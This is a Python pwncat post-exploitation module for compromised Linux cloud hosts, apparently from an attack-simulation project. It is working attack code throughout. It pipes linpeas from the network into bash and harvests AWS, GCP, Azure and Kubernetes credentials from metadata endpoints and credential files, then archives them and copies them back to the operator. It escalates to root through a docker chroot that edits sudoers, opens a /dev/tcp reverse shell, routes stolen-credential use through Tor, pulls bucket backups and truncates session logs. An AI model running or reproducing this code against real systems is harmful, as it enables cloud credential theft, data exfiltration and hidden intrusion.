#!/usr/bin/env python3
from email.policy import default
import os
from pwncat.modules import BaseModule, Argument
from pwncat.manager import Session
from pwncat.platform.linux import Linux
from pathlib import Path
import subprocess
import shutil
import tarfile
import base64
from datetime import datetime


class Module(BaseModule):
    PLATFORM = [Linux]
    ARGUMENTS = {
        "reverse_shell_host": Argument(
            str,
            help="The reverse shell host, default is public ip of the host obtained by icanhazip.com",
        ),
        "reverse_shell_port": Argument(
            str,
            help="The reverse shell port.",
        ),
        "default_payload": Argument(
            str,
            help="The default payload to execute when hosts connect.",
        ),

    }

    def run(self, session: Session, reverse_shell_host: str, reverse_shell_port: str, default_payload: str):
        session.log("starting module")

        session_lock = Path("/tmp/pwncat_session.lock")
        task_name = "default"

        try:
            session.log("creating session lock: /tmp/pwncat_session.lock")
            session_lock.touch()

            def encode_base64(data):
                try:
                    data = str(data).encode('utf-8')
                except (UnicodeDecodeError, AttributeError):
                    pass
                return base64.b64encode(data).decode()

            def run_base64_payload(session, payload, log_name="base64_payload", cwd="/tmp", timeout=7200):
                encoded_payload = encode_base64(payload)
                session.log(f"Running payload: {encoded_payload}")
                return run_remote(session, f"/bin/bash -c 'echo {encoded_payload} | tee \"{cwd}/{log_name}\" | base64 -d | /bin/bash'", cwd, timeout)

            def run_remote(session, payload, cwd="/tmp", timeout=7200):
                return session.platform.run(payload, cwd=cwd, timeout=timeout)

            def copy_file(session, source_file, dest_file, direction):
                if direction == 'local_to_remote':
                    if Path(source_file).exists():
                        session.log(
                            f"copying from local: {source_file} => {dest_file}")
                        with open(source_file, 'rb') as f1:
                            with session.platform.open(dest_file, 'wb') as f2:
                                f2.write(f1.read())
                    else:
                        session.log(f"local file not found: {source_file}")
                elif direction == 'remote_to_local':
                    if session.platform.Path(source_file).exists():
                        session.log(
                            f"copying from remote: {source_file} => {dest_file}")
                        with session.platform.open(source_file, 'rb') as f1:
                            with open(dest_file, 'wb') as f2:
                                f2.write(f1.read())
                    else:
                        session.log(f"remote file not found: {source_file}")
                else:
                    raise ValueError(
                        "Invalid direction specified for file copy: must be 'local_to_remote' or 'remote_to_local'")

            def enum_exfil_prep_creds(csp, task_name):
                session.log("running enumerate...")
                enumerate(csp)
                session.log("enumerate complete")
                session.log("running exfiltrate...")
                exfiltrate(csp)
                session.log("exfiltrate complete")
                session.log("running prep_local_env...")
                prep_local_env(csp=csp, task_name=task_name)
                session.log("prep_local_env complete")

            def enumerate(csp="aws"):
                extended = "interesting_files,interesting_perms_files,api_keys_regex"
                limited = "system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information"

                if csp is "aws" or "azure":
                    opts = f"{limited},{extended}"
                else:
                    # gcp sessions timeout with extensive
                    opts = limited

                command = f"curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | /bin/bash -s -- -s -N -o {opts} | tee /tmp/linpeas.txt"

                # create a wait and retry payload
                payload = retry_command(command=command)

                # run host enumeration
                try:
                    session.log("payload loaded and ready")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_linpeas", timeout=1800)
                    session.log(result)
                except Exception as e:
                    session.log(f"Enumeration failed: {e}")
                    pass

            def exfiltrate(csp):
                # create an instance profile to exfiltrate
                if csp == "aws":
                    payload = '''
# disable pager
export AWS_PAGER=""

if ! command -v jq; then
  curl -LJ -o /usr/local/bin/jq https://github.com/jqlang/jq/releases/download/jq-1.7/jq-linux-amd64 && chmod 755 /usr/local/bin/jq
fi

# Helper function to update AWS configuration and credentials files
configure_aws() {
    local profile=$1
    local access_key=$2
    local secret_key=$3
    local session_token=$4
    local region=$5

    mkdir -p ~/.aws
    if [ ! -z "$access_key" ]; then
        aws configure set aws_access_key_id "$access_key" --profile=$profile
    fi
    if [ ! -z "$secret_key" ]; then
        aws configure set aws_secret_access_key "$secret_key" --profile=$profile
    fi
    if [ ! -z "$session_token" ]; then
        aws configure set aws_session_token "$session_token" --profile=$profile
    fi
    if [ ! -z "$region" ]; then
        aws configure set region "$region" --profile=$profile
    fi
}

# Retrieve and configure current user credentials using AWS CLI
configure_current_user() {
    if command -v aws &> /dev/null; then
        # Export credentials using aws configure export-credentials
        local creds=$(aws configure export-credentials --format env-no-export)

        # Parse the credentials
        local access_key=$(echo "$creds" | grep 'AWS_ACCESS_KEY_ID' | cut -d '=' -f 2)
        local secret_key=$(echo "$creds" | grep 'AWS_SECRET_ACCESS_KEY' | cut -d '=' -f 2)
        local session_token=$(echo "$creds" | grep 'AWS_SESSION_TOKEN' | cut -d '=' -f 2)
        local region=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)

        # Use the helper function to configure the 'default' profile
        configure_aws default "$access_key" "$secret_key" "$session_token" "$region"
    else
        # Fallback to environment variables if AWS CLI is not present
        if [ -n "$AWS_ACCESS_KEY_ID" ] && [ -n "$AWS_SECRET_ACCESS_KEY" ]; then
            configure_aws default "$AWS_ACCESS_KEY_ID" "$AWS_SECRET_ACCESS_KEY" "$AWS_SESSION_TOKEN" "$(curl -s http://169.254.169.254/latest/meta-data/placement/region)"
        fi
    fi
}

# Retrieve and configure instance profile credentials
configure_instance_profile() {
    local instance_profile=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
    local credentials=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$instance_profile)
    local access_key=$(echo "$credentials" | grep "AccessKeyId" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
    local secret_key=$(echo "$credentials" | grep "SecretAccessKey" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
    local session_token=$(echo "$credentials" | grep "Token" | awk -F ' : ' '{ print $2 }' | tr -d ',' | xargs)
    local region=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)

    configure_aws instance $access_key $secret_key $session_token $region
}

# Retrieve and configure container/web identity credentials using environment variables
configure_container_identity() {
    # Check if running in a container environment with web identity tokens
    if [ -n "$AWS_WEB_IDENTITY_TOKEN_FILE" ]; then
        if command -v aws &> /dev/null; then
            # Export credentials using aws configure export-credentials
            local creds=$(aws configure export-credentials --format env-no-export)

            # Parse the credentials
            local access_key=$(echo "$creds" | grep 'AWS_ACCESS_KEY_ID' | cut -d '=' -f 2)
            local secret_key=$(echo "$creds" | grep 'AWS_SECRET_ACCESS_KEY' | cut -d '=' -f 2)
            local session_token=$(echo "$creds" | grep 'AWS_SESSION_TOKEN' | cut -d '=' -f 2)
            local region=$(curl -s http://169.254.169.254/latest/meta-data/placement/region)

            # Use the helper function to configure the 'container' profile
            configure_aws container "$access_key" "$secret_key" "$session_token" "$region"
        fi
    fi
}

configure_current_user
configure_instance_profile
configure_container_identity
'''
                    session.log(
                        "exporting possible default, instance and container credentials...")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_awsconfigcreds")
                    session.log(result)

                    # remove any pre-existing cred archived
                    if session.platform.Path('/tmp/aws_creds.tgz').exists():
                        session.platform.unlink('/tmp/aws_creds.tgz')

                    # enumerate aws creds
                    payload = 'find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\''
                    session.log("running credentials find...")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_awscredsfind")
                    session.log(result)

                    # create an archive of all aws creds
                    payload = 'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')'
                    session.log("payload loaded and ready")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_awscreds")
                    session.log(result)
                elif csp == "gcp":
                    # get instance metadata
                    payload = "curl \"http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text\" -H \"Metadata-Flavor: Google\" > /tmp/instance_metadata.json"
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_instancemetadata")
                    session.log(result)
                    # get instance token
                    payload = '''ACCESS_TOKEN=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google" | jq -r '.access_token')
echo $ACCESS_TOKEN > /tmp/instance_access_token.json
'''
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_instancetoken")
                    session.log(result)

                    # remove any pre-existing cred archived
                    if session.platform.Path('/tmp/gcp_creds.tgz').exists():
                        session.platform.unlink('/tmp/gcp_creds.tgz')

                    # enumerate gcp creds
                    payload = 'find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\''
                    session.log("running credentials find...")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_gcpcredsfind")
                    session.log(result)

                    # create an archive of all gcp creds
                    payload = 'tar -czvf /tmp/gcp_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials.json\' -a -path \'*.config/gcloud/credentials.json\' \) \)  -printf \'%P\n\')'
                    session.log("payload loaded and ready")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_gcpcreds")
                    session.log(result)
                if csp == "azure":
                    # get instance metadata
                    payload = 'curl -s -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | jq'
                    session.log("running instance metadata find...")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_instancemetadata")
                    session.log(result)

                    # remove any pre-existing cred archived
                    if session.platform.Path('/tmp/azure_creds.tgz').exists():
                        session.platform.unlink('/tmp/azure_creds.tgz')

                    # enumerate azure creds
                    payload = 'find / \( -type f -a \( -name \'my.azureauth.json\' -a -path \'*.azure/my.azureauth\' \) -o \( -name \'azureProfile.json\' -a -path \'*.azure/azureProfile.json\' \) \)  -printf \'%P\n\''
                    session.log("running credentials find...")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_azurecredsfind")
                    session.log(result)

                    # create an archive of all azure creds
                    payload = 'tar -czvf /tmp/azure_creds.tgz -C / $(find / \( -type f -a \( -name \'my.azureauth\' -a -path \'*.azure/my.azureauth\' \) -o \( -name \'azureProfile.json\' -a -path \'*.azure/azureProfile.json\' \) \)  -printf \'%P\n\')'
                    session.log("payload loaded and ready")
                    result = run_base64_payload(
                        session=session, payload=payload, log_name="payload_azurecreds")
                    session.log(result)

                # create an archive of all kube creds
                payload = 'tar -czvf /tmp/kube_creds.tgz -C / $(find / \( -type f -a \( -name \'config\' -a -path \'*.kube/config\' \) \)  -printf \'%P\n\')'
                session.log("payload loaded and ready")
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_kubecreds")
                session.log(result)

                # copy files
                files = [f"/tmp/{csp}_creds.tgz",
                         "/tmp/kube_creds.tgz",
                         "/tmp/linpeas.txt",
                         "/tmp/instance_access_token.json",
                         "/tmp/instance_metadata.json"]
                for file in files:
                    copy_file(
                        session, source_file=file, dest_file=f'/tmp/{hostname}_{os.path.basename(file)}', direction='remote_to_local')
                    if session.platform.Path(file).exists():
                        session.platform.Path(file).unlink()

            # adds current session user to sudoers
            def docker_escalate(task, reverse_shell_host, reverse_shell_port):
                payload = f"""
while ! command -v docker; do "echo waiting for docker..."; sleep 30; done
CURRENT_USER=$(whoami)
echo "current user: $CURRENT_USER"
COMMAND="bash -c 'echo \\"$CURRENT_USER ALL=(ALL) NOPASSWD:ALL\\" > /etc/sudoers.d/custom-sudoers'"
PAYLOAD=$(echo -n $COMMAND | base64 -w0)
docker run --rm -v /:/host/ ubuntu:latest chroot /host /bin/bash -c "echo $PAYLOAD | base64 -d | /bin/bash"
echo "new user: $(sudo whoami)"
echo "starting escalated reverse shell..."
nohup sudo /bin/bash -c "TASK={task} /bin/bash -i >& /dev/tcp/{reverse_shell_host}/{reverse_shell_port} 0>&1" >/dev/null 2>&1 &
"""
                session.log("running docker escalate session...")
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_dockerescalate")
                session.log(result)

            def retry_command(command, max_attempts=5, sleep=10):
                return f"""
# command to execute
COMMAND="{command}"

# Max number of attempts to start the Docker container
max_attempts={max_attempts}
attempt=0

while true; do
    # Increment the attempt counter
    ((attempt++))
    # Start the long-running command using nohup in the background
    nohup /bin/bash -c "$COMMAND" >/dev/null 2>&1 &

    # Store the Process ID of the background command
    PID=$!

    # Monitoring loop to check if the process is still running
    while kill -0 $PID 2>/dev/null; do
        echo "Process $PID is still running..."
        sleep {sleep}
    done

    # Wait for the process to finish and capture its exit status
    wait $PID
    EXIT_STATUS=$?

    # Check if the command was successful
    if [[ $EXIT_STATUS -eq 0 ]]; then
        echo "Command executed successfully."
        break
    else
        echo "Failed to execute command. Retrying..."
    fi

    # Check if maximum attempts have been reached
    if [[ $attempt -eq $max_attempts ]]; then
        echo "Maximum attempts reached, failing now."
        break
    fi
done
"""

            def credentialed_access_tor(csp, jobname, cwd, script, args=""):
                # start torproxy docker
                if not csp in ["aws", "gcp", "azure"]:
                    raise Exception(f'Unknown csp used {csp}')

                if task_name == "scan2kubeshell":
                    container = f'ghcr.io/credibleforce/proxychains-{csp}-cli:main'
                else:
                    container = f'ghcr.io/credibleforce/proxychains-scoutsuite-{csp}:main'
                try:
                    payload = encode_base64(
                        f"""
docker stop torproxy || true; docker rm torproxy || true; 
{retry_command(command="docker run -d --rm --name torproxy -p 9050:9050 dperson/torproxy")}
""")
                    session.log(f"Running payload: {payload}")
                    result = subprocess.run(
                        ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_{jobname}_torproxy | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                    session.log(result)

                    if result.returncode != 0:
                        session.log('The bash script encountered an error.')
                    else:
                        session.log("successfully started torproxy docker.")

                        session.log(
                            f"running {script} via torproxy tunnelled container...")

                        # assume credentials prep added creds to local home
                        if csp == "aws":
                            local_creds = str(Path.joinpath(
                                Path.home(), Path(".aws")))
                            container_creds = "/root/.aws"
                        elif csp == "gcp":
                            local_creds = str(Path.joinpath(
                                Path.home(), Path(".config/gcloud")))
                            container_creds = "/root/.config/gcloud"
                        elif csp == "azure":
                            local_creds = str(Path.joinpath(
                                Path.home(), Path(".azure")))
                            container_creds = "/root/.azure"

                        local_kube_creds = str(Path.joinpath(
                            Path.home(), Path(".kube")))
                        container_kube_creds = "/root/.kube"

                        session.log(f"Starting tor tunneled docker...")
                        payload = encode_base64(
                            f"""
docker rm --force proxychains-{jobname}-{csp} || true;
export TORPROXY="$(docker inspect -f \'{{{{range .NetworkSettings.Networks}}}}{{{{.IPAddress}}}}{{{{end}}}}\' torproxy)"; 
{retry_command(command=f'docker run --rm --name=proxychains-{jobname}-{csp} --link torproxy:torproxy -e TORPROXY=$TORPROXY -v "/tmp":"/tmp" -v "{local_creds}":"{container_creds}" -v "{local_kube_creds}":"{container_kube_creds}" -v "{cwd}":"/{jobname}" {container} /bin/bash /{jobname}/{script} {args}')}
""")
                        session.log(f"Running payload: {payload}")
                        result = subprocess.run(
                            ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_{jobname} | base64 -d | /bin/bash'], cwd=cwd, capture_output=True, text=True)
                        session.log(f'Return Code: {result.returncode}')
                        session.log(f'Output: {result.stdout}')
                        session.log(f'Error Output: {result.stderr}')

                        if result.returncode != 0:
                            session.log(
                                'The bash script encountered an error.')
                except Exception as e:
                    session.log(f'Error executing bash script: {e}')

            def prep_local_env(task_name, csp=None):
                # create work directory
                task_path = Path(f"/{task_name}")
                if task_path.exists() and task_path.is_dir():
                    shutil.rmtree(task_path)
                task_path.mkdir(parents=True)

                if csp == "aws":
                    # create aws directory
                    aws_dir = Path.joinpath(Path.home(), Path(".aws"))
                    if not aws_dir.exists():
                        # shutil.rmtree(aws_dir)
                        aws_dir.mkdir(parents=True)

                    # extract the first set aws creds
                    if Path(f'/tmp/{hostname}_aws_creds.tgz').exists():
                        file = tarfile.open(f'/tmp/{hostname}_aws_creds.tgz')
                        for m in file.getmembers():
                            if m.isfile() and (m.path.endswith('/.aws/credentials') or m.path.endswith('/.aws/config')):
                                session.log(
                                    f"extracting: {m.path} => {task_path}")
                                file.extract(m, task_path)
                                src_file = Path.joinpath(
                                    task_path, Path(m.path))
                                dst_file = Path.joinpath(
                                    aws_dir, Path(os.path.basename(m.path)))
                                session.log(
                                    f"copying: {src_file} => {dst_file}")
                                shutil.copy2(src_file, dst_file)
                    else:
                        session.log(
                            f"aws creds not found: /tmp/{hostname}_aws_creds.tgz")

                    payload = encode_base64(
                        f'aws configure list-profiles')
                    session.log(f"Running payload: {payload}")
                    result = subprocess.run(
                        ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_checkprofiles | base64 -d | /bin/bash'], cwd=task_path, capture_output=True, text=True)
                    session.log(result)

                    payload = encode_base64(
                        f'aws configure list --profile=default')
                    session.log(f"Running payload: {payload}")
                    result = subprocess.run(
                        ['/bin/bash', '-c', f'echo {payload} | tee /tmp/payload_checkdefault | base64 -d | /bin/bash'], cwd=task_path, capture_output=True, text=True)
                    session.log(result)
                elif csp == "gcp":
                    # create aws directory
                    # ~/.config/gcloud/credentials.json
                    gcp_dir = Path.joinpath(
                        Path.home(), Path(".config"), Path("gcloud"))
                    if not gcp_dir.exists():
                        gcp_dir.mkdir(parents=True)

                    # extract the first set gcp creds
                    if Path(f'/tmp/{hostname}_gcp_creds.tgz').exists():
                        file = tarfile.open(f'/tmp/{hostname}_gcp_creds.tgz')
                        for m in file.getmembers():
                            if m.isfile() and m.path.endswith('/.config/gcloud/credentials.json') and (m.path.startswith('root') or m.path.startswith('home')):
                                session.log(
                                    f"extracting: {m.path} => {task_path}")
                                file.extract(m, task_path)
                                src_file = Path.joinpath(
                                    task_path, Path(m.path))
                                dst_file = Path.joinpath(
                                    gcp_dir, Path(os.path.basename(m.path)))
                                session.log(
                                    f"copying: {src_file} => {dst_file}")
                                shutil.copy2(src_file, dst_file)
                                break
                    else:
                        session.log(
                            f"gcp creds not found: /tmp/{hostname}_gcp_creds.tgz")
                elif csp == "azure":
                    # create aws directory
                    azure_dir = Path.joinpath(Path.home(), Path(".azure"))
                    if not azure_dir.exists():
                        # shutil.rmtree(azure_dir)
                        azure_dir.mkdir(parents=True)

                    # extract the first set azure creds
                    if Path(f'/tmp/{hostname}_azure_creds.tgz').exists():
                        file = tarfile.open(f'/tmp/{hostname}_azure_creds.tgz')
                        for m in file.getmembers():
                            if m.isfile() and (m.path.endswith('/.azure/my.azureauth')):
                                session.log(
                                    f"extracting: {m.path} => {task_path}")
                                file.extract(m, task_path)
                                src_file = Path.joinpath(
                                    task_path, Path(m.path))
                                dst_file = Path.joinpath(
                                    azure_dir, Path(os.path.basename(m.path)))
                                session.log(
                                    f"copying: {src_file} => {dst_file}")
                                shutil.copy2(src_file, dst_file)
                    else:
                        session.log(
                            f"azure creds not found: /tmp/{hostname}_azure_creds.tgz")

                # copy our payload to the local working directory
                task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
                shutil.copy2(task_script, task_path)

                # copy linpeas.txt into our working directory
                linpeas = Path(f'/tmp/{hostname}_linpeas.txt')
                shutil.copy2(linpeas, task_path)

                # extract the kube config if they exist
                kube_dir = Path.joinpath(
                    Path.home(), Path(".kube"))
                if not kube_dir.exists():
                    kube_dir.mkdir(parents=True)
                if Path(f'/tmp/{hostname}_kube_creds.tgz').exists():
                    file = tarfile.open(f'/tmp/{hostname}_kube_creds.tgz')
                    for m in file.getmembers():
                        if m.isfile() and (m.path.endswith('/.kube/config')):
                            session.log(f"extracting: {m.path} => {task_path}")
                            file.extract(m, task_path)
                            src_file = Path.joinpath(task_path, Path(m.path))
                            dst_file = Path.joinpath(
                                kube_dir, Path(os.path.basename(m.path)))
                            session.log(f"copying: {src_file} => {dst_file}")
                            shutil.copy2(src_file, dst_file)
                            break
                else:
                    session.log(
                        f"kube creds not found: /tmp/{hostname}_kube_creds.tgz")

            # get hostname for disk loggings
            hostname = session.platform.getenv('HOSTNAME')

            script_dir = os.path.dirname(os.path.realpath(__file__))
            session.log(f"script dir: {script_dir}")
            task_name = session.platform.getenv("TASK")
            session.log(f"task environment: {task_name}")
            if task_name == "instance2rds" or task_name == "iam2rds" or task_name == "iam2enum":
                csp = "aws"
                enum_exfil_prep_creds(csp, task_name)
                session.log("running credentialed_access_tor...")
                credentialed_access_tor(
                    csp=csp,
                    jobname=task_name,
                    cwd=f'/{task_name}',
                    script=f'{task_name}.sh',
                    args=""
                )
                session.log("credentialed_access_tor complete")
            # update to add 15 minute timeout
            elif task_name == "gcpiam2cloudsql":
                csp = "gcp"
                enum_exfil_prep_creds(csp, task_name)
                # storage not available via tor network - region exclusion so we need to do this locally :(
                payload = """
USER=$(gcloud auth list --filter=status:ACTIVE --format="value(account)" | awk -F "@" '{ print $1 }')
DEPLOYMENT=$(echo ${USER##*-})
BUCKET_URL=$(gsutil ls | grep db-backup-target-$DEPLOYMENT)
echo $BUCKET_URL
"""
                session.log("payload loaded and ready")
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_bucket_url")
                session.log(result)
                bucket_url = bytes(result.stdout).decode().strip()
                session.log("running credentialed_access_tor...")
                credentialed_access_tor(
                    csp=csp,
                    jobname=task_name,
                    cwd=f'/{task_name}',
                    script=f'{task_name}.sh',
                    args=f"--bucket-url={bucket_url}"
                )
                payload = f"gsutil cp -r {bucket_url} /tmp 2>&1 | tee -a $LOGFILE"
                session.log("payload loaded and ready")
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_retrieve_backup")
                session.log(result)
                session.log("credentialed_access_tor complete")
            elif task_name == "azureiam2azuresql":
                csp = "azure"
                enum_exfil_prep_creds(csp, task_name)
                # storage not available via tor network - region exclusion so we need to do this locally :(
                session.log("running credentialed_access_tor...")
                credentialed_access_tor(
                    csp=csp,
                    jobname=task_name,
                    cwd=f'/{task_name}',
                    script=f'{task_name}.sh',
                    args=""
                )
                session.log("credentialed_access_tor complete")
            elif task_name == "scan2kubeshell":
                csp = "aws"
                current_user = session.platform.getenv('USER')
                session.log(f"current user: {current_user}")
                if current_user != "root":
                    session.log(
                        f"current is not root escalating privleges and reconnecting...")
                    docker_escalate(task_name, reverse_shell_host,
                                    reverse_shell_port)
                    session.log(f"session escalation call complete.")
                    return
                else:
                    enum_exfil_prep_creds(csp, "iam2enum")
                    session.log("running iam2enum enumeration...")
                    credentialed_access_tor(
                        csp=csp,
                        jobname="iam2enum",
                        cwd=f'/iam2enum',
                        script=f'iam2enum.sh',
                        args="--profile=default"
                    )
                    session.log("iam2enum enumeration complete")

                    tmp_dir = Path("/tmp")
                    # create work directory
                    task_path = Path(f"/{task_name}")
                    if task_path.exists() and task_path.is_dir():
                        shutil.rmtree(task_path)
                    task_path.mkdir(parents=True)

                    # copy our payload to the local working directory
                    task_script = Path(
                        f"{script_dir}/../resources/{task_name}.sh")
                    shutil.copy2(task_script, task_path)
                    session.log(
                        "running scan2kubeshell credentialed_access_tor...")
                    credentialed_access_tor(
                        csp=csp,
                        jobname=task_name,
                        cwd=f'/{task_name}',
                        script=f'{task_name}.sh',
                        args=f'--reverse-shell-host={reverse_shell_host} --reverse-shell-port={reverse_shell_port}'
                    )
                    session.log("credentialed_access_tor complete")
            elif task_name == "kube2s3":
                csp = "aws"

                # run pod escape and exfil kube2s3
                tmp_dir = Path("/tmp")
                # create work directory
                task_path = Path(f"/{task_name}")
                if task_path.exists() and task_path.is_dir():
                    shutil.rmtree(task_path)
                task_path.mkdir(parents=True)

                # copy our payload to the local working directory
                task_script = Path(f"{script_dir}/../resources/{task_name}.sh")
                shutil.copy2(task_script, task_path)

                with open(Path.joinpath(task_path, Path(f"{task_name}.sh")), 'r') as f:
                    payload = f.read()

                session.log("running s3 exfil payload...")
                result = run_base64_payload(
                    session=session, payload=payload, log_name="payload_kube2s3")
                session.log(result)

                files = ["/tmp/kube_bucket.tgz", "/tmp/kube2s3.log"]
                file_list = ", ".join(files)
                session.log(
                    f"copying scan results: {file_list}...")
                for file in files:
                    copy_file(session, source_file=file,
                              dest_file=f'/tmp/{os.path.basename(file)}', direction='remote_to_local')
                    if session.platform.Path(file).exists():
                        session.platform.Path(file).unlink()
                session.log("done")

                # extract kube s3 prod files
                if Path(f'/tmp/{os.path.basename(files[0])}').exists():
                    file = tarfile.open(f'/tmp/{os.path.basename(files[0])}')
                    for m in file.getmembers():
                        if m.isfile():
                            session.log(f"extracting: {m.path} => {task_path}")
                            file.extract(m, task_path)
                            src_file = Path.joinpath(task_path, Path(m.path))
                            dst_file = Path.joinpath(
                                tmp_dir, Path(os.path.basename(m.path)))
                            session.log(f"copying: {src_file} => {dst_file}")
                            shutil.copy2(src_file, dst_file)
                else:
                    session.log(
                        f"kube tar not found: /tmp/{os.path.basename(files[0])}")

                # now run iam2enum to retrieve creds for enumeration over tor

                # context here is we're inside pod that has access to s3
                enum_exfil_prep_creds(csp, "iam2enum")
                session.log(
                    "running iam2enum container profile enumeration...")
                # here we'll have oidc container credentials from the pod
                credentialed_access_tor(
                    csp=csp,
                    jobname="iam2enum",
                    cwd=f'/iam2enum',
                    script=f'iam2enum.sh',
                    args="--profile=container"
                )
            else:
                result = run_remote(session, default_payload)
                session.log(result)

            session.log("Removing sesssion lock...")
            if session_lock.exists():
                session_lock.unlink()

            session.log("Done.")
        except Exception as e:
            session.log(f'Error executing bash script: {e}')
            pass

        session.log("Backup pwncat.log...")
        pwncat_log = Path("/tmp/pwncat.log")
        if pwncat_log.exists():
            dest_log = Path(
                f"/tmp/pwncat_session_{task_name}.log")
            session.log(
                f"Copying session log {pwncat_log.as_posix()} => {dest_log.as_posix()}")
            source = pwncat_log.read_bytes()
            dest_log.write_bytes(source)
            os.truncate(pwncat_log.as_posix(), 0)

        if session_lock.exists():
            session_lock.unlink()
